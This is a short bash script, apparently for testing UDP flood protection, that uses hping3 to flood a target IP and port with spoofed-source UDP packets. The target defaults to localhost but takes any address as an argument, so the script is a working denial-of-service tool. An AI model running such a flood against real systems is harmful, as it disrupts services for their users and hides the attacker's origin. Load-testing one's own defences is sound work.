#!/bin/bash
#
# UDP Flood Attack Simulation
# Tests UDP flood protection
#

TARGET_IP="${1:-127.0.0.1}"
TARGET_PORT="${2:-53}"
PACKET_COUNT="${3:-10000}"

echo "=== UDP Flood Test ==="
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Packets: $PACKET_COUNT"
echo ""

if ! command -v hping3 &> /dev/null; then
    echo "Error: hping3 not installed"
    echo "Install with: sudo apt-get install hping3"
    exit 1
fi

echo "Starting UDP flood attack simulation..."
echo "Press Ctrl+C to stop"
echo ""

sudo hping3 \
    --flood \
    --rand-source \
    --udp \
    -p "$TARGET_PORT" \
    -c "$PACKET_COUNT" \
    "$TARGET_IP"

echo ""
echo "Test complete"
